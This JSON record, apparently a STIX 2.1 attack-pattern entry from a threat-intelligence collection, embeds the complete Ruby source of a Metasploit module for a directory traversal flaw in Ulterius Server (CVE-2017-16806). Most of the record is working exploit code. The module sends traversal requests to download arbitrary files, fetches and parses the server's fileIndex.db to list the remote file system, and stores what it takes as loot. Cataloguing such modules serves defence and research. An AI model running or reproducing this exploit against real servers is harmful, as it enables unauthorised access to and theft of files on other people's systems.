{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--774d7ae3-9ae6-4247-be68-5a35d5f3bffa",
    "created": "2024-08-14T16:24:11.940527Z",
    "modified": "2024-08-14T16:24:11.940531Z",
    "name": "Ulterius Server File Download Vulnerability",
    "description": " This module exploits a directory traversal vulnerability in Ulterius Server < v1.9.5.0 to download files from the affected host. A valid file path is needed to download a file. Fortunately, Ulterius indexes every file on the system, which can be stored in the following location: ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/ulterius_file_download.rb",
            "external_id": "ulterius_file_download.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-16806"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Ulterius Server File Download Vulnerability',\n        'Description' => %q{\n          This module exploits a directory traversal vulnerability in Ulterius Server < v1.9.5.0\n          to download files from the affected host. A valid file path is needed to download a file.\n          Fortunately, Ulterius indexes every file on the system, which can be stored in the\n          following location:\n\n          http://ulteriusURL:port/.../fileIndex.db.\n\n          This module can download and parse the fileIndex.db file. There is also an option to\n          download a file using a provided path.\n        },\n        'Author' => [\n          'Rick Osgood', # Vulnerability discovery and PoC\n          'Jacob Robles' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'EDB', '43141' ],\n          [ 'CVE', '2017-16806' ]\n        ]\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(22006),\n        OptString.new('PATH', [true, 'Path to the file to download', '/.../fileIndex.db']),\n      ]\n    )\n  end\n\n  def process_data(index, parse_data)\n    length = parse_data[index].unpack('C')[0]\n    length += parse_data[index + 1].unpack('C')[0]\n    length += parse_data[index + 2].unpack('C')[0]\n    length += parse_data[index + 3].unpack('C')[0]\n\n    index += 4\n    filename = parse_data[index...index + length]\n    index += length\n    return index, filename\n  end\n\n  def inflate_parse(data)\n    zi = Zlib::Inflate.new(-15)\n    data_inflated = zi.inflate(data)\n\n    parse_data = data_inflated[8...-1]\n    remote_files = ''\n\n    index = 0\n    print_status('Starting to parse fileIndex.db...')\n    while index < parse_data.length\n      index, filename = process_data(index, parse_data)\n      index, directory = process_data(index, parse_data)\n      remote_files << directory + '\\\\' + filename + \"\\n\"\n\n      # skip FFFFFFFFFFFFFFFF\n      index += 8\n    end\n    myloot = store_loot('ulterius.fileIndex.db', 'text/plain', datastore['RHOST'], remote_files, 'fileIndex.db', 'Remote file system')\n    print_status(\"Remote file paths saved in: #{myloot}\")\n  end\n\n  def run\n    path = datastore['PATH']\n    # Always make sure there is a starting slash so as an user,\n    # we don't need to worry about it.\n    path = \"/#{path}\" if path && path[0] != '/'\n\n    print_status(\"Requesting: #{path}\")\n\n    begin\n      res = send_request_cgi({\n        'uri' => normalize_uri(path),\n        'method' => 'GET'\n      })\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,\n           Rex::HostUnreachable, Errno::ECONNRESET => e\n      vprint_error(\"Failed: #{e.class} - #{e.message}\")\n      return\n    end\n\n    if res && res.code == 200\n      if path =~ /fileIndex\\.db/i\n        inflate_parse(res.body)\n      else\n        myloot = store_loot('ulterius.file.download', 'text/plain', datastore['RHOST'], res.body, path, 'Remote file system')\n        print_status(\"File contents saved: #{myloot}\")\n      end\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}